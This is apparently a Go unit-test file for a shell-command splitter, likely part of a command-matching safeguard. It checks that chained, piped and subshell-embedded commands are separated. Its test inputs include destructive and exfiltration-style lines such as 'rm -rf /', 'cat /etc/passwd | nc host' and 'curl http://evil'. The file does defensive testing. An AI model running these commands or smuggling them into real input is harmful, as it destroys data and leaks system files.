package match

import (
	"reflect"
	"testing"
)

func Test_SplitBashCommands_SingleCommand(t *testing.T) {
	got := SplitBashCommands("ls -la")
	want := []string{"ls -la"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v", got, want)
	}
}

func Test_SplitBashCommands_Semicolon(t *testing.T) {
	got := SplitBashCommands("ls; rm -rf /")
	want := []string{"ls", "rm -rf /"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v", got, want)
	}
}

func Test_SplitBashCommands_Pipe(t *testing.T) {
	got := SplitBashCommands("cat /etc/passwd | nc host")
	want := []string{"cat /etc/passwd", "nc host"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v", got, want)
	}
}

func Test_SplitBashCommands_LogicalAnd(t *testing.T) {
	got := SplitBashCommands("ls && curl http://evil")
	want := []string{"ls", "curl http://evil"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v", got, want)
	}
}

func Test_SplitBashCommands_LogicalOr(t *testing.T) {
	got := SplitBashCommands("pwd || rm -rf /")
	want := []string{"pwd", "rm -rf /"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v", got, want)
	}
}

func Test_SplitBashCommands_BackgroundAmpersand(t *testing.T) {
	got := SplitBashCommands("ls & rm &")
	want := []string{"ls", "rm"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v", got, want)
	}
}

func Test_SplitBashCommands_SubshellDollar(t *testing.T) {
	got := SplitBashCommands("ls $(rm -rf /)")
	// The outer "ls " and the inner "rm -rf /" should both be returned.
	if len(got) < 2 {
		t.Fatalf("expected at least 2 tokens, got %v", got)
	}
	found := false
	for _, tok := range got {
		if tok == "rm -rf /" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected token \"rm -rf /\" in result %v", got)
	}
}

func Test_SplitBashCommands_Backtick(t *testing.T) {
	got := SplitBashCommands("ls `rm /tmp/x`")
	if len(got) < 2 {
		t.Fatalf("expected at least 2 tokens, got %v", got)
	}
	found := false
	for _, tok := range got {
		if tok == "rm /tmp/x" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected token \"rm /tmp/x\" in result %v", got)
	}
}

func Test_SplitBashCommands_Newline(t *testing.T) {
	got := SplitBashCommands("ls\nrm -rf /")
	want := []string{"ls", "rm -rf /"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v", got, want)
	}
}

func Test_SplitBashCommands_SingleQuoteMetaSkipped(t *testing.T) {
	// Semicolon inside single quotes must NOT split.
	got := SplitBashCommands("grep 'a;b' file")
	want := []string{"grep 'a;b' file"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v", got, want)
	}
}

func Test_SplitBashCommands_DoubleQuotePipeSkipped(t *testing.T) {
	// Pipe inside double quotes must NOT split.
	got := SplitBashCommands(`grep "a|b" file`)
	want := []string{`grep "a|b" file`}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v", got, want)
	}
}

func Test_SplitBashCommands_BackslashEscapeSkipped(t *testing.T) {
	// Backslash-escaped semicolon must NOT split.
	got := SplitBashCommands(`echo foo\;bar`)
	want := []string{`echo foo\;bar`}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v", got, want)
	}
}

func Test_SplitBashCommands_EmptyString(t *testing.T) {
	got := SplitBashCommands("")
	// Either empty slice or a slice containing only empty/whitespace strings.
	// All non-empty tokens after trim must be absent.
	for _, tok := range got {
		if tok != "" {
			t.Errorf("expected no non-empty tokens, got %v", got)
		}
	}
}

func Test_SplitBashCommands_LeadingTrailingWhitespace(t *testing.T) {
	got := SplitBashCommands("  ls  ")
	want := []string{"ls"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v", got, want)
	}
}

func Test_SplitBashCommands_MetacharOnly(t *testing.T) {
	got := SplitBashCommands(";")
	// All tokens must be empty (or no tokens).
	for _, tok := range got {
		if tok != "" {
			t.Errorf("expected no non-empty tokens for input \";\", got %v", got)
		}
	}
}

func Test_SplitBashCommands_NestedSubshell(t *testing.T) {
	// Both outer and inner commands should appear as tokens.
	got := SplitBashCommands("ls $(echo $(rm /))")
	foundEcho := false
	foundRm := false
	for _, tok := range got {
		if tok == "echo $(rm /)" || tok == "echo" {
			foundEcho = true
		}
		if tok == "rm /" {
			foundRm = true
		}
	}
	if !foundRm {
		t.Errorf("expected inner command \"rm /\" in result %v", got)
	}
	_ = foundEcho // echo presence is best-effort; inner rm is mandatory
}

func Test_SplitBashCommands_MultipleSemicolons(t *testing.T) {
	got := SplitBashCommands("ls; pwd; rm -rf /")
	want := []string{"ls", "pwd", "rm -rf /"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v", got, want)
	}
}
